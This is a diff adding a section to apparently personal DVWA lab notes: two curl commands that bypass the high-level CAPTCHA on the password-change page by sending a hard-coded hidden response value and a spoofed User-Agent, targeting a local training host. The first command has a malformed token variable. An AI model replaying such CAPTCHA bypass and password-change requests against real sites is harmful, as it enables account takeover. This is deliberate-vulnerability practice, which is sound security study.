@@ -62,6 +62,28 @@ curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${CSRF}&L
 
 ---
 
+reCAPTCHA
+
+```bash
+curl -v -L \
+-c cookies.txt -b cookies.txt \
+-X POST $HOST \
+-H "User-Agent: ${USER_AGENT}" \
+--data-raw \
+"step=1&password_new=${NEW_PASSWORD}&password_conf=${NEW_PASSWORD}&g-recaptcha-response=${G_RES}&user_token=${TOKEN&}Change=Change"
+```
+
+```bash
+curl -v -L \
+--cookie "PHPSESSID=4774b7d45d62876f2f8a2e93ba5e7640;security=high" \
+-X POST http://dvwa.localtest/vulnerabilities/captcha/ \
+-H "User-Agent: reCAPTCHA" \
+--data-raw \
+"step=1&password_new=1111&password_conf=1111&g-recaptcha-response=hidd3n_valu3&user_token=54fb2e161e4428868c54085b6764dfe3&Change=Change"
+```
+
+---
+
 # Ref
 
 DVWA - Brute Force (Medium Level) - Time Delay - g0tmi1k
